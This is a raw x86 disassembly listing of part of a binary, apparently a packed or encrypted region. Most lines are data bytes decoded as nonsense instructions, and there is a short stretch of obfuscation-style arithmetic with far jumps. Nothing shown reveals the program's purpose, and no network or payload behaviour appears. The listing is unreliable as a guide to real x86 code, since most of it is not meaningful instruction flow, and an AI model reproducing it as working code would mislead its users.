  41a315:	or     bh,BYTE PTR [ecx+0x4eb40a01]
  41a31b:	jmp    0x41a2ee
  41a31d:	and    al,0x9f
  41a31f:	loop   0x41a332
  41a321:	fwait
  41a322:	cmp    eax,0x105be698
  41a327:	arpl   cx,sp
  41a329:	(bad)  
  41a32a:	mov    eax,0x501277b
  41a32f:	data16 je 0x41a33a
  41a332:	dec    esi
  41a333:	icebp  
  41a334:	shr    BYTE PTR [edi+0x682c544c],cl
  41a33a:	repz jp 0x41a33a
  41a33d:	div    BYTE PTR [edi+eax*8-0x2b]
  41a341:	cmc    
  41a342:	mov    al,ds:0x83e6eed3
  41a347:	daa    
  41a348:	out    dx,eax
  41a349:	add    DWORD PTR [edx-0xd1a26d0],ebp
  41a34f:	scas   eax,DWORD PTR es:[edi]
  41a350:	adc    BYTE PTR [eax-0xd],ch
  41a353:	pushf  
  41a354:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a355:	stc    
  41a356:	stc    
  41a357:	cmp    eax,0xb2f7ca48
  41a35c:	jge    0x41a2e8
  41a35e:	shl    bl,cl
  41a360:	dec    esp
  41a361:	jg     0x41a2e4
  41a363:	xor    al,0x9c
  41a365:	fidiv  WORD PTR [edx]
  41a367:	stc    
  41a368:	jbe    0x41a3e5
  41a36a:	mov    ebp,0xeaddeb8a
  41a36f:	mov    ds,ecx
  41a371:	mov    bl,0xef
  41a373:	lods   al,BYTE PTR ds:[esi]
  41a374:	lods   al,BYTE PTR ds:[esi]
  41a375:	mov    ebx,0xb16e61fa
  41a37a:	lds    esi,FWORD PTR [edi]
  41a37c:	nop
  41a37d:	xchg   ebx,eax
  41a37e:	jne    0x41a39c
  41a380:	and    dh,cl
  41a382:	mov    BYTE PTR [ebp+0x1a],bl
  41a385:	dec    ebx
  41a386:	mov    ebp,0xdd0d13ca
  41a38b:	int3   
  41a38c:	loope  0x41a3b3
  41a38e:	sbb    BYTE PTR ds:0xe2abfb3d,cl
  41a394:	sti    
  41a395:	test   BYTE PTR [esi+0x3f17d863],bh
  41a39b:	or     DWORD PTR [ebp-0x54],ecx
  41a39e:	sbb    dh,BYTE PTR [edi-0x1c]
  41a3a1:	pop    esp
  41a3a2:	or     dh,bl
  41a3a4:	dec    ecx
  41a3a5:	xchg   edi,eax
  41a3a6:	xor    esp,DWORD PTR [esi-0xa3f9ec4]
  41a3ac:	in     al,dx
  41a3ad:	mov    eax,ds:0xc6e37452
  41a3b2:	rol    DWORD PTR [edi+0x1ecd305],0x57
  41a3b9:	mov    WORD PTR [ebx+0x12d606b1],es
  41a3bf:	push   ss
  41a3c0:	inc    esp
  41a3c1:	dec    BYTE PTR [edi+0x5]
  41a3c4:	out    dx,al
  41a3c5:	pop    edi
  41a3c6:	xor    al,0xbc
  41a3c8:	pop    edx
  41a3c9:	jmp    0x571f:0xecea2d1c
  41a3d0:	loop   0x41a3ae
  41a3d2:	pop    es
  41a3d3:	pop    ss
  41a3d4:	jecxz  0x41a3de
  41a3d6:	inc    esp
  41a3d7:	push   eax
  41a3d8:	or     al,0xf3
  41a3da:	jne    0x41a37a
  41a3dc:	and    al,0xe5
  41a3de:	fs push 0xffffff92
  41a3e1:	jbe    0x41a458
  41a3e3:	sbb    BYTE PTR [eax+0x5c885c9f],0x2d
  41a3ea:	ret    0xfe5c
  41a3ed:	add    edx,DWORD PTR [ebx+0x2e]
  41a3f0:	daa    
  41a3f1:	or     al,0x91
  41a3f3:	sub    edx,DWORD PTR [ebx]
  41a3f5:	cli    
  41a3f6:	and    ebp,eax
  41a3f8:	push   cs
  41a3f9:	sbb    al,0x26
  41a3fb:	sub    al,0xb3
  41a3fd:	sbb    DWORD PTR [edx],ebp
  41a3ff:	jmp    0x7b55:0x5e8c954c
  41a406:	scas   al,BYTE PTR es:[edi]
  41a407:	xchg   ebx,eax
  41a408:	sub    DWORD PTR [ebp-0x749ce057],edx
  41a40e:	add    eax,0x69d3e643
  41a413:	or     BYTE PTR [esi],ah
  41a415:	fist   WORD PTR [ecx+ebx*1]
  41a418:	ins    BYTE PTR es:[edi],dx
  41a419:	bound  ebp,QWORD PTR [edx+0x45]
  41a41c:	adc    al,0xdf
  41a41e:	fisub  WORD PTR [edx-0xd76b8f2]
  41a424:	loope  0x41a492
  41a426:	ds test edi,ecx
  41a429:	inc    ebx
  41a42a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a42b:	cmp    esp,DWORD PTR [edi-0x34]
  41a42e:	mov    DWORD PTR [edi],edx
  41a430:	shl    BYTE PTR [eax-0x3d9ab110],1
  41a436:	jns    0x41a49e
  41a438:	retf   0x6f49
  41a43b:	scas   eax,DWORD PTR es:[edi]
  41a43c:	fistp  WORD PTR [ebp+ebp*8-0x21]
  41a440:	ins    BYTE PTR es:[edi],dx
  41a441:	cmp    BYTE PTR [eax-0x8706f83],0x54
  41a448:	mov    esp,0x8218213c
  41a44d:	inc    edx
  41a44e:	jno    0x41a49e
  41a450:	jge    0x41a3dd
  41a452:	shl    ebx,1
  41a454:	int3   
  41a455:	mov    bh,0xd1
  41a457:	mov    al,ds:0xb51c1afe
  41a45c:	jno    0x41a41f
  41a45e:	add    ecx,DWORD PTR [esi-0x6a107a93]
  41a464:	xor    ah,ah
  41a466:	sbb    DWORD PTR [esi-0x3c00d982],ebp
  41a46c:	pop    esi
  41a46d:	mov    eax,ds:0x800d7840
  41a472:	add    eax,0x809f1681
  41a477:	push   0x65
  41a479:	fnstsw WORD PTR [ebp+esi*8+0x4e]
  41a47d:	push   es
  41a47e:	imul   eax,DWORD PTR [esi],0xffffffce
  41a481:	jne    0x41a44b
  41a483:	push   ebp
  41a484:	repnz or al,0x6a
  41a487:	clc    
  41a488:	lock in al,0x5
  41a48b:	scas   eax,DWORD PTR es:[edi]
  41a48c:	add    al,0x14
  41a48e:	icebp  
  41a48f:	or     al,0x26
  41a491:	and    bh,bh
  41a493:	cli    
  41a494:	add    DWORD PTR [ecx],esi
  41a496:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a497:	sub    edx,edi
  41a499:	adc    ecx,DWORD PTR [ecx]
  41a49b:	sub    DWORD PTR [esi+0x6f8d1561],ebp
  41a4a1:	aas    
  41a4a2:	test   BYTE PTR [ebp+0x63fdcc87],bl
  41a4a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4a9:	fild   QWORD PTR [ecx+ebx*4+0x5e]
  41a4ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a4ae:	icebp  
  41a4af:	or     DWORD PTR ds:0xa3174936,0x79
  41a4b6:	pop    esi
  41a4b7:	int    0x1c
  41a4b9:	dec    ebp
  41a4ba:	sub    al,0x34
  41a4bc:	and    esi,DWORD PTR [eax+0x60]
  41a4bf:	mov    ecx,0xdd0de0d8
  41a4c4:	or     eax,0xfb4f856f
  41a4c9:	push   esp
  41a4ca:	add    DWORD PTR [ebx+0x4e],0x47
  41a4ce:	jb     0x41a476
  41a4d0:	adc    DWORD PTR [edx],edi
  41a4d2:	aam    0xa5
  41a4d4:	inc    ebx
  41a4d5:	cmp    al,BYTE PTR [ebx]
  41a4d7:	xchg   esi,eax
  41a4d8:	outs   dx,BYTE PTR ds:[esi]
  41a4d9:	dec    esp
  41a4da:	and    ebp,DWORD PTR es:[esi-0x22]
  41a4de:	jo     0x41a4d3
  41a4e0:	push   ecx
  41a4e1:	mov    eax,ds:0x952df1ae
  41a4e6:	(bad)  
  41a4e7:	mov    WORD PTR [ecx+0x5000e6a1],fs
  41a4ed:	aam    0xa
  41a4ef:	inc    ebp
  41a4f0:	fild   QWORD PTR [ecx-0x46]
  41a4f3:	ror    DWORD PTR [edi],1
  41a4f5:	icebp  
  41a4f6:	dec    ebx
  41a4f7:	aad    0x30
  41a4f9:	jo     0x41a49e
  41a4fb:	mov    dh,0x27
  41a4fd:	ror    DWORD PTR [edi+0x5a],1
  41a500:	push   0xffffffba
  41a502:	inc    edx
  41a503:	xchg   ecx,eax
  41a504:	xor    esp,ebp
  41a506:	(bad)  [edi]
  41a508:	in     eax,0xb3
  41a50a:	add    BYTE PTR [eax-0x5e01b75],ah
  41a510:	fst    QWORD PTR ds:0x6c187a6e
  41a516:	stc    
  41a517:	add    al,BYTE PTR [ebx-0x7b]
  41a51a:	out    dx,al
  41a51b:	repz adc eax,0xdeba968d
  41a521:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a522:	sub    bh,dl
  41a524:	popa   
  41a525:	dec    esi
  41a526:	push   0x43
  41a528:	fist   DWORD PTR [ebx-0x76]
  41a52b:	push   esi
  41a52c:	(bad)  
  41a52d:	jne    0x41a5ac
  41a52f:	add    DWORD PTR [ebp+edi*2+0x4e],ebx
  41a533:	stos   BYTE PTR es:[edi],al
  41a534:	in     al,dx
  41a535:	nop
  41a536:	mov    eax,0x1b2ffc42
  41a53b:	shl    DWORD PTR [edx+0x6b],cl
  41a53e:	mov    bl,0x70
  41a540:	cmp    eax,0x10974d5d
  41a545:	xchg   edx,eax
  41a546:	jnp    0x41a4dc
  41a548:	das    
  41a549:	xchg   ebx,eax
  41a54b:	add    ebx,0x3becff48
  41a551:	dec    BYTE PTR [ebp+0x43]
  41a554:	sub    DWORD PTR [ebx+0x5bf646d6],ecx
  41a55a:	fucomip st,st(1)
  41a55c:	loop   0x41a4fb
  41a55e:	cmp    BYTE PTR [ecx],al
  41a560:	jns    0x41a58e
  41a562:	push   eax
  41a563:	gs add dl,ch
  41a566:	push   ecx
  41a567:	ss push ebp
  41a569:	std    
  41a56a:	call   0x653f7d11
  41a56f:	pop    esi
  41a570:	(bad)  
  41a571:	cmp    dh,BYTE PTR [ebp+0x4]
  41a574:	fidiv  DWORD PTR [edx]
  41a576:	and    eax,DWORD PTR [eax+esi*4+0x6c753753]
  41a57d:	push   ebp
  41a57e:	xor    ch,ah
  41a580:	jns    0x41a57d
  41a582:	rcr    ecx,0x6a
  41a585:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a586:	push   0x71714d9a
  41a58b:	xchg   edi,eax
  41a58c:	pop    ebx
  41a58d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a58e:	fcom   DWORD PTR [edi-0x7a6f6502]
  41a594:	jge    0x41a5ab
  41a596:	aam    0xed
  41a598:	mov    ch,0x6a
  41a59a:	mov    dh,0xb9
  41a59c:	loopne 0x41a5e4
  41a59e:	imul   edx,DWORD PTR [ecx],0x54
  41a5a1:	push   es
  41a5a2:	test   BYTE PTR [ebx+0xa16b623],dh
  41a5a8:	int    0x87
  41a5aa:	push   0xf0708071
  41a5af:	int    0xe6
  41a5b1:	ins    BYTE PTR es:[edi],dx
  41a5b2:	lods   eax,DWORD PTR ds:[esi]
  41a5b3:	pop    eax
  41a5b4:	mov    esp,0x984e3dc4
  41a5b9:	jl     0x41a5a2
  41a5bb:	mov    ebx,0x8c66058
  41a5c0:	cwde   
  41a5c1:	div    DWORD PTR [eax-0x69ffb865]
  41a5c7:	(bad)  
  41a5c8:	jbe    0x41a560
  41a5ca:	daa    
  41a5cb:	jg     0x41a55a
  41a5cd:	adc    ebx,DWORD PTR [edi-0x74]
  41a5d0:	adc    eax,0xc07156a3
  41a5d5:	loop   0x41a5c5
  41a5d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5d8:	rol    DWORD PTR [edx+edi*1],0x8e
  41a5dc:	mov    ds:0x3d23677e,eax
  41a5e1:	inc    eax
  41a5e2:	int    0x95
  41a5e4:	adc    eax,0x43b7b5c5
  41a5e9:	je     0x41a5fd
  41a5eb:	bound  edi,QWORD PTR [ebx+0x52fb6c7]
  41a5f1:	fld    QWORD PTR [edx-0x4cfaf284]
  41a5f7:	shr    eax,0xb1
  41a5fa:	and    al,0xf3
  41a5fc:	imul   edx,DWORD PTR [esi],0x8f581ce8
  41a602:	scas   eax,DWORD PTR es:[edi]
  41a603:	out    dx,eax
  41a604:	add    al,0x7f
  41a606:	lods   eax,DWORD PTR ds:[esi]
  41a607:	xlat   BYTE PTR ds:[ebx]
  41a608:	jmp    0x41a63e
  41a60a:	out    dx,eax
  41a60b:	pop    edx
  41a60c:	mov    fs,WORD PTR [edx]
  41a60e:	inc    edi
  41a60f:	call   0x9830905a
  41a614:	xlat   BYTE PTR ds:[ebx]
  41a615:	jb     0x41a68b
  41a617:	shl    BYTE PTR [ebx],0xc2
  41a61a:	dec    esp
  41a61b:	jecxz  0x41a64d
  41a61d:	cmp    DWORD PTR [ebx+0x2d],ecx
  41a620:	enter  0x3fbd,0x3d
  41a624:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a625:	cmp    ebp,DWORD PTR [edx-0xdb8d97b]
  41a62b:	lahf   
  41a62c:	stos   BYTE PTR es:[edi],al
  41a62d:	rcr    BYTE PTR [ebp*8-0x1b10bcfb],0x3f
  41a635:	sbb    al,0xc5
  41a637:	dec    edx
  41a638:	or     eax,0xcfa30e0e
  41a63d:	(bad)  
  41a63e:	cmovle eax,edx
  41a641:	mov    edx,0xbe331bab
  41a646:	je     0x41a617
  41a648:	and    al,BYTE PTR [edi]
  41a64a:	dec    ebp
  41a64b:	(bad)  
  41a64c:	pop    edx
  41a64d:	sbb    DWORD PTR [ebp+0x83fa233],edx
  41a653:	mov    esp,0x1533489b
  41a658:	mov    al,ds:0x1f91ef36
  41a65d:	mov    edi,0x3f6ca57f
  41a662:	pop    ecx
  41a663:	aas    
  41a664:	xchg   esp,eax
  41a665:	xchg   esp,eax
  41a666:	mov    esi,DWORD PTR [edx]
  41a668:	repnz or BYTE PTR fs:[edx+0x52],bl
  41a66d:	add    edi,DWORD PTR [ecx-0x7fd123a9]
  41a673:	dec    esi
  41a674:	outs   dx,BYTE PTR ds:[esi]
  41a675:	inc    ecx
  41a676:	pop    ecx
  41a677:	push   edx
  41a678:	les    edi,FWORD PTR [edi+0x65bfba18]
  41a67e:	mov    dl,BYTE PTR [eax]
  41a680:	mov    ds:0xe7c1ae3f,al
  41a685:	inc    ebx
  41a686:	loop   0x41a671
  41a688:	mov    cs,WORD PTR [esi-0x3c]
  41a68b:	dec    eax
  41a68c:	or     dh,BYTE PTR [eax-0x2ad3678c]
  41a692:	test   eax,ecx
  41a694:	fnclex 
  41a696:	add    ecx,DWORD PTR [ebp-0x18]
  41a699:	nop
  41a69a:	xchg   ebp,eax
  41a69b:	rol    BYTE PTR [edi-0x30d07682],1
  41a6a1:	push   ebx
  41a6a2:	pop    es
  41a6a3:	(bad)  
  41a6a5:	xchg   esp,eax
  41a6a6:	mov    fs,WORD PTR [edi-0x7e]
  41a6a9:	add    al,0x32
  41a6ab:	out    dx,eax
  41a6ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a6ad:	xchg   ebx,eax
  41a6ae:	mov    esi,?
  41a6b0:	out    dx,al
  41a6b1:	sbb    al,0xef
  41a6b3:	(bad)  
  41a6b4:	pop    edi
  41a6b5:	push   cs
  41a6b6:	mov    DWORD PTR ds:[ecx+0x6dd7ee73],ebp
  41a6bd:	lods   al,BYTE PTR ds:[esi]
  41a6be:	push   es
  41a6bf:	in     eax,dx
  41a6c0:	or     ebp,0x8baf1c96
  41a6c6:	jp     0x41a664
  41a6c8:	lds    edi,FWORD PTR [edi]
  41a6ca:	push   ebp
  41a6cb:	inc    ebx
  41a6cc:	sbb    DWORD PTR [esi],0xea16518d
  41a6d2:	sub    DWORD PTR [ecx+eiz*1+0x56250134],edx
  41a6d9:	xchg   edi,eax
  41a6da:	xchg   edi,eax
  41a6db:	sahf   
  41a6dc:	or     bl,BYTE PTR [ecx-0x18]
  41a6df:	add    ebx,esi
  41a6e1:	push   ds
  41a6e2:	test   DWORD PTR [ecx],ebx
  41a6e4:	fld    TBYTE PTR [edx]
  41a6e6:	or     bh,BYTE PTR [ebx-0x17fa8f3]
  41a6ec:	sub    eax,0x187018cd
  41a6f1:	div    BYTE PTR [ebp-0x740b226b]
  41a6f7:	inc    edi
  41a6f8:	or     eax,0x9e12c749
  41a6fd:	mov    ds:0xcea22b4a,eax
  41a702:	sub    bl,BYTE PTR [edi]
  41a704:	mov    ebp,0x6c6e7af6
  41a709:	lods   eax,DWORD PTR ds:[esi]
  41a70a:	mov    ebp,0x6df50030
  41a70f:	cmp    eax,0xd17106be
  41a714:	popa   
  41a715:	jne    0x41a72d
  41a717:	inc    eax
  41a718:	sbb    al,0xad
  41a71a:	sbb    dl,dl
  41a71c:	das    
  41a71d:	sub    eax,0xa2893928
  41a722:	sub    DWORD PTR [ebx+0x7],esp
  41a725:	sub    eax,0xd1e02c40
  41a72a:	xor    dh,BYTE PTR [edx-0x10]
  41a72d:	push   esi
  41a72e:	push   esi
  41a72f:	sbb    eax,0x34484aaf
  41a734:	ror    BYTE PTR [edx+esi*2],0xb
  41a738:	cdq    
  41a739:	sbb    eax,0x8c712ce9
  41a73e:	pop    esp
  41a73f:	push   es
  41a740:	out    0xe5,eax
  41a742:	rcr    esi,0xa3
  41a745:	mov    WORD PTR [edx],?
  41a747:	cmp    esp,DWORD PTR [esi]
  41a749:	ret    
  41a74a:	inc    ebx
  41a74b:	or     dl,BYTE PTR [edi+0x53]
  41a74e:	sbb    eax,DWORD PTR [esi]
  41a750:	test   eax,0xbd105b2
  41a755:	scas   eax,DWORD PTR es:[edi]
  41a756:	jecxz  0x41a7b8
  41a758:	mov    edx,DWORD PTR ds:0x57d8cb26
  41a75e:	pop    esi
  41a75f:	cmp    DWORD PTR [ecx-0x7],0xffffffe9
  41a763:	aam    0x31
  41a765:	adc    al,0xfd
  41a767:	cmp    BYTE PTR [edx+0x13],bh
  41a76a:	cmova  ebp,DWORD PTR [ecx+0x3f]
  41a76e:	mov    bl,0xa1
  41a770:	xor    dl,dl
  41a772:	(bad)  
  41a773:	sbb    eax,0x3675b8d1
  41a778:	add    al,0xdf
  41a77a:	mov    ds:0xcbc2eac8,al
  41a77f:	fstp   TBYTE PTR ds:0x750a18f3
  41a785:	xchg   esi,eax
  41a786:	ret    
  41a787:	iret   
  41a788:	enter  0x38b2,0xa9
  41a78c:	ror    BYTE PTR [edx],0x18
  41a78f:	jge    0x41a712
  41a791:	jmp    0xb4fd1259
  41a796:	data16 sub al,0x50
  41a799:	mov    edx,0x9edc293
  41a79e:	sub    eax,DWORD PTR [ebp+0x45825546]
  41a7a4:	jmp    0x41a77c
  41a7a6:	xchg   esp,eax
  41a7a7:	rol    BYTE PTR [ecx+0x19c5bde1],cl
  41a7ad:	shl    BYTE PTR [ecx-0x22],0xba
  41a7b1:	sbb    al,0x62
  41a7b4:	push   ecx
  41a7b5:	or     eax,0x3cd13670
  41a7ba:	mov    ebp,0x42cbca23
  41a7bf:	xchg   DWORD PTR [ebp+0x45],eax
  41a7c2:	pop    ebx
  41a7c3:	mov    edx,DWORD PTR [ebp-0x14]
  41a7c6:	mov    DWORD PTR [ebp+0x8],edx
  41a7c9:	jmp    0x41cb87
  41a7ce:	mov    edx,DWORD PTR [ebp+0x8]
  41a7d1:	mov    ebx,DWORD PTR [ebp-0x8]
  41a7d4:	xor    edx,eax
  41a7d6:	xor    ebx,eax
  41a7d8:	sub    edx,ebx
  41a7da:	sub    edx,esi
  41a7dc:	xor    edx,eax
  41a7de:	mov    DWORD PTR [ebp+0x8],edx
  41a7e1:	mov    edx,DWORD PTR [ebp+0x8]
  41a7e4:	mov    ebx,DWORD PTR [ebp-0x58]
  41a7e7:	add    edx,0x5708c4
  41a7ed:	imul   edx,ebx
  41a7f0:	mov    DWORD PTR [ebp-0x58],edx
  41a7f3:	mov    edx,DWORD PTR [ebp+0x8]
  41a7f6:	mov    ebx,DWORD PTR [ebp-0x54]
  41a7f9:	add    edx,0x64f8da
  41a7ff:	or     edx,ebx
  41a801:	mov    DWORD PTR [ebp-0x54],edx
  41a804:	mov    edx,DWORD PTR [ebp+0x8]
  41a807:	mov    ebx,DWORD PTR [ebp-0x50]
  41a80a:	add    edx,ecx
  41a80c:	xor    edx,ebx
  41a80e:	mov    DWORD PTR [ebp-0x50],edx
  41a811:	mov    edx,DWORD PTR [ebp+0x8]
  41a814:	mov    ebx,DWORD PTR [ebp-0x4c]
  41a817:	add    edx,edi
  41a819:	jmp    0x41cb62
  41a81e:	retf   
  41a81f:	lock xacquire sub DWORD PTR [ebx+0x2b],esi
  41a824:	mov    bl,0x72
  41a826:	cmp    bl,BYTE PTR [ebp+ebx*2-0x6a243fd2]
  41a82d:	mov    ds:0x7c7d1390,al
  41a832:	inc    eax
  41a833:	pop    edi
  41a834:	jl     0x41a8b2
  41a836:	adc    dh,BYTE PTR [ecx-0x425878df]
  41a83c:	rol    DWORD PTR [edx+edi*2-0x3c],cl
  41a840:	scas   al,BYTE PTR es:[edi]
  41a841:	mov    dl,0x99
  41a843:	and    eax,0x3f056f09
  41a848:	xchg   esi,eax
  41a849:	out    dx,eax
  41a84a:	sub    BYTE PTR [eax-0x7],dl
  41a84d:	mov    esi,0x25b40a39
  41a852:	mov    edi,0xe04b8074
  41a857:	popf   
  41a858:	sub    al,BYTE PTR [edx]
  41a85a:	test   eax,0x28e083cc
  41a85f:	popf   
  41a860:	sub    eax,0xde94802d
  41a865:	in     eax,dx
  41a866:	and    DWORD PTR [ebp+0x41],esi
  41a869:	out    dx,al
  41a86a:	jmp    0x41a872
  41a86c:	adc    ecx,DWORD PTR [ebp+0x1e]
  41a86f:	bound  edx,QWORD PTR [ecx+0x3f57becd]
  41a875:	mov    edi,0x5005a2d6
  41a87a:	sbb    ecx,DWORD PTR [ebx+edi*2]
  41a87d:	mov    esp,0xb020f3a2
  41a882:	bound  edi,QWORD PTR [ecx+0x36]
  41a885:	inc    eax
  41a886:	xor    ah,BYTE PTR [ecx-0x2206320b]
  41a88c:	(bad)  
  41a88d:	sub    BYTE PTR ds:[eax-0x61],bh
  41a891:	hlt    
  41a892:	mov    ch,BYTE PTR [ebx+0x6b]
  41a895:	jl     0x41a8ab
  41a897:	stos   BYTE PTR es:[edi],al
  41a898:	or     ch,0xee
  41a89b:	mov    BYTE PTR [edx],bh
  41a89d:	stc    
  41a89e:	mov    esp,0xefe0b436
  41a8a3:	stc    
  41a8a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8a5:	popa   
  41a8a6:	sub    eax,0xf0fa3c97
  41a8ab:	mov    ecx,0xb4a96743
  41a8b0:	or     ebx,DWORD PTR [edx+0x4d]
  41a8b3:	(bad)  
  41a8b5:	inc    ebp
  41a8b6:	sbb    ch,bl
  41a8b8:	jle    0x41a8ff
  41a8ba:	mov    edi,0xb8302d29
  41a8bf:	xchg   ebp,eax
  41a8c0:	ficomp WORD PTR [ecx+eiz*2]
  41a8c3:	mov    ebp,0xe5b04d2c
  41a8c8:	xor    ebp,DWORD PTR [edi+0x5cc45e9c]
  41a8ce:	leave  
  41a8cf:	and    ecx,DWORD PTR [esi]
  41a8d1:	js     0x41a88b
  41a8d3:	push   ecx
  41a8d4:	push   esp
  41a8d5:	test   DWORD PTR [ecx+0x7020cf76],0x2727f250
  41a8df:	push   ss
  41a8e0:	outs   dx,BYTE PTR ds:[esi]
  41a8e1:	loope  0x41a8b8
  41a8e3:	das    
  41a8e4:	mov    ds:0xb2a84295,eax
  41a8e9:	sub    ah,BYTE PTR [eax+0x251c1cd]
  41a8ef:	(bad)  
  41a8f0:	adc    BYTE PTR [ebx-0x77],cl
  41a8f3:	dec    edx
  41a8f4:	stc    
  41a8f5:	mov    WORD PTR [edx],cs
  41a8f7:	pop    ds
  41a8f8:	les    esi,FWORD PTR [eax]
  41a8fa:	aad    0x89
  41a8fc:	and    al,0x5d
  41a8fe:	xchg   edx,eax
  41a8ff:	mov    eax,0x39a7a9aa
  41a904:	int    0xca
  41a906:	(bad)  
  41a908:	int    0x40
  41a90a:	aam    0x9e
  41a90c:	call   0xf7b66ce1
  41a911:	or     BYTE PTR [esp+ecx*2+0x92e2355],ah
  41a918:	lahf   
  41a919:	sbb    bh,al
  41a91b:	imul   eax,DWORD PTR [eax+0x4c],0x7a
  41a91f:	push   0x29a9fcd6
  41a924:	mov    ds:0x31d98ba1,al
  41a929:	into   
  41a92a:	xchg   ebp,eax
  41a92b:	jp     0x41a9a0
  41a92d:	out    0x51,eax
  41a92f:	mov    ah,0x59
  41a931:	jns    0x41a92a
  41a933:	frstor [ecx]
  41a935:	test   DWORD PTR [eax],esi
  41a937:	pop    es
  41a938:	sub    eax,0x63fcc086
  41a93d:	int    0x6d
  41a93f:	repz xchg edx,eax
  41a941:	std    
  41a942:	mov    dl,0xe8
  41a944:	cli    
  41a945:	fsub   QWORD PTR [ecx-0x1a6a8023]
  41a94b:	ss dec edx
  41a94d:	xchg   ebp,eax
  41a94e:	inc    esi
  41a94f:	dec    ecx
  41a950:	xor    eax,0x394f725
  41a955:	xchg   edi,eax
  41a956:	inc    ecx
  41a957:	xor    ebx,DWORD PTR ds:0xe5d1c9f1
  41a95d:	mov    ds:0x6862b099,al
  41a962:	out    0xf3,al
  41a964:	mov    ebp,0x31e6f026
  41a969:	mov    cl,0xc8
  41a96b:	jmp    0x1ce82a70
  41a970:	mov    DWORD PTR [edx],esi
  41a972:	push   esp
  41a973:	jmp    0x974565ab
  41a978:	dec    esp
  41a979:	aam    0x11
  41a97b:	sti    
  41a97c:	sub    BYTE PTR [esi-0x55d4be96],al
  41a982:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a983:	mov    ebp,0x832235b1
  41a988:	mov    esi,0x6bdc7fd5
  41a98d:	xor    al,0xbc
  41a98f:	test   ah,bl
  41a991:	lea    ebp,[esi+0x179df15]
  41a997:	pop    eax
  41a998:	inc    edi
  41a999:	cld    
  41a99a:	dec    eax
  41a99b:	test   DWORD PTR [eax+0x2d],edx
  41a99e:	sub    dh,BYTE PTR [eax+0x3d355565]
  41a9a4:	mov    DWORD PTR [edi+0x1c2c3ab3],ecx
  41a9aa:	mov    bl,dh
  41a9ac:	push   es
  41a9ad:	xor    bl,cl
  41a9af:	stc    
  41a9b0:	cmc    
  41a9b1:	sbb    eax,0x4ccf0936
  41a9b6:	mov    eax,0xdbd980e9
  41a9bb:	xchg   edi,eax
  41a9bc:	scas   al,BYTE PTR es:[edi]
  41a9bd:	mov    cl,0x2d
  41a9bf:	adc    dh,BYTE PTR [esi-0x25]
  41a9c2:	lds    ebx,FWORD PTR [edx-0x39]
  41a9c5:	outs   dx,DWORD PTR ds:[esi]
  41a9c6:	cs jl  0x41a9d2
  41a9c9:	loopne 0x41a9f9
  41a9cb:	in     al,dx
  41a9cc:	or     eax,0x7ecbcbb
  41a9d1:	cmp    ch,BYTE PTR [edx-0x5efc4126]
  41a9d7:	push   0x7a
  41a9d9:	push   ebx
  41a9da:	jo     0x41aa03
  41a9dc:	jle    0x41aa4e
  41a9de:	mov    ah,0x6b
  41a9e0:	dec    edx
  41a9e1:	ret    0xe332
  41a9e4:	in     eax,0x3f
  41a9e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9e7:	xchg   ebx,eax
  41a9e8:	mov    DWORD PTR ds:0xb2c7d1ad,0x72d309ff
  41a9f2:	bound  edi,QWORD PTR [ecx-0x1c8bab96]
  41a9f8:	adc    DWORD PTR [ebp-0x3d],ecx
  41a9fb:	es add esi,esp
  41a9fe:	mov    BYTE PTR [esi],ch
  41aa00:	or     al,0x41
  41aa02:	mov    al,0xe3
  41aa04:	call   DWORD PTR [ecx+0x25]
  41aa07:	mov    dh,0x6f
  41aa09:	outs   dx,DWORD PTR ds:[esi]
  41aa0a:	fstp   QWORD PTR [ecx+0x5599e514]
  41aa10:	rcr    DWORD PTR [edx-0x70242b52],1
  41aa16:	ins    BYTE PTR es:[edi],dx
  41aa17:	dec    ecx
  41aa18:	ins    BYTE PTR es:[edi],dx
  41aa19:	bound  esi,QWORD PTR [ecx]
  41aa1b:	adc    DWORD PTR [edx+edi*1-0x76],esp
  41aa1f:	inc    esp
  41aa20:	jmp    0x41aa5e
  41aa22:	pop    esp
  41aa23:	inc    ecx
  41aa24:	aaa    
  41aa25:	fst    st(0)
  41aa27:	lahf   
  41aa28:	adc    dl,bl
  41aa2a:	add    BYTE PTR [edx+0x29d0a761],bl
  41aa30:	repz sub dl,ch
  41aa33:	ja     0x41aa04
  41aa35:	jb     0x41aa4e
  41aa37:	pop    edi
  41aa38:	jge    0x41a9f4
  41aa3a:	mov    esi,0xafae5346
  41aa3f:	clc    
  41aa40:	inc    edx
  41aa41:	int3   
  41aa42:	xor    bh,BYTE PTR [ebp+0x32a3adb0]
  41aa48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa49:	clc    
  41aa4a:	xchg   edx,eax
  41aa4b:	imul   esp,DWORD PTR [ebp*2+0x4a4a3d30],0xffffffb9
  41aa53:	mov    ds:0x7fd628d1,al
  41aa58:	shl    BYTE PTR [ebp+0x5218f3ff],1
  41aa5e:	jno    0x41aa98
  41aa60:	and    dl,BYTE PTR [edx+0x72]
  41aa63:	push   eax
  41aa64:	fdiv   DWORD PTR [edx+0x1acb306]
  41aa6a:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa6c:	leave  
  41aa6d:	push   ds
  41aa6e:	clc    
  41aa6f:	je     0x41a9f8
  41aa71:	mov    edi,0xb0fc8f57
  41aa76:	aas    
  41aa77:	and    BYTE PTR [ecx],dl
  41aa79:	mov    ch,0xfa
  41aa7b:	cmp    ebx,ecx
  41aa7d:	jb     0x41aa3d
  41aa7f:	and    BYTE PTR [esi+ecx*1],dl
  41aa82:	loopne 0x41aa75
  41aa84:	pushf  
  41aa85:	push   edi
  41aa86:	mov    cl,0x8c
  41aa88:	js     0x41ab05
  41aa8a:	pusha  
